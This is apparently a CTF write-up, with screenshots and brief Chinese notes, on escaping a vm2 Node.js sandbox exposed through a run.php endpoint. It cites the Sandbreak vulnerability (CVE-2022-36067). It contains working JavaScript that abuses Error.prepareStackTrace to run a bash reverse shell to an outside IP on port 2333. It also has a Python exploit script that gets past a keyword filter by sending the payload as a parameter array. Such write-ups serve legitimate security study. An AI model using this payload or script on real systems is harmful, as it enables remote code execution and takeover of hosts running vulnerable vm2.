![[Pasted image 20230203085920.png|500]]

![[Pasted image 20230203090337.png|700]]

```
/run.php?code=phpinfo();
```

```
ReferenceError: phpinfo is not defined
```

![[Pasted image 20230203090553.png|500]]

```
/run.php?code=new Error().stack
```

![[Pasted image 20230203090731.png|700]]

[GHSA-mrgp-mrhc-5jrq](https://github.com/patriksimek/vm2/security/advisories/GHSA-mrgp-mrhc-5jrq)

> vm2 is a sandbox that can run untrusted code with whitelisted Node's built-in modules. In versions prior to version 3.9.11, a threat actor can bypass the sandbox protections to gain remote code execution rights on the host running the sandbox. This vulnerability was patched in the release of version 3.9.11 of vm2. There are no known workarounds.

参考 [Enter "Sandbreak" - Vulnerability In vm2 Sandbox Module Enables Remote Code Execution (CVE-2022-36067)](https://web.archive.org/web/20231001013710/https://www.oxeye.io/resources/vm2-sandbreak-vulnerability-cve-2022-36067)

```javascript
globalThis.OldError = globalThis.Error;
globalThis.Error = {};
globalThis.Error.prepareStackTrace = function (errStr, traces) {
    traces[0].getThis().process.mainModule.require('child_process').execSync('bash -c "bash -i >& /dev/tcp/xxx.xxx.xxx.xxx/2333 0>&1"');
}
const {stack} = new globalThis.OldError();
```

通过替换大法让虚假的`prepareStackTrace`得到执行

![[Pasted image 20230203100235.png|300]]

题目存在关键词过滤，通过传递参数数组绕过

# exp

```python
import requests
from urllib.request import quote

url = 'http://xxx.node4.buuoj.cn:81/run.php?code[]={}'

payload = '''globalThis.OldError = globalThis.Error;
globalThis.Error = {};
globalThis.Error.prepareStackTrace = function (errStr, traces) {
    traces[0].getThis().process.mainModule.require('child_process').execSync('bash -c "bash -i >& /dev/tcp/xxx.xxx.xxx.xxx/2333 0>&1"');
}
const {stack} = new globalThis.OldError();'''

requests.get(url.format(quote(payload)))
```

![[Pasted image 20230203101146.png|500]]

#Web #nodejs #js #vm2 #Vulnerabilities #escape #RCE #反弹shell 
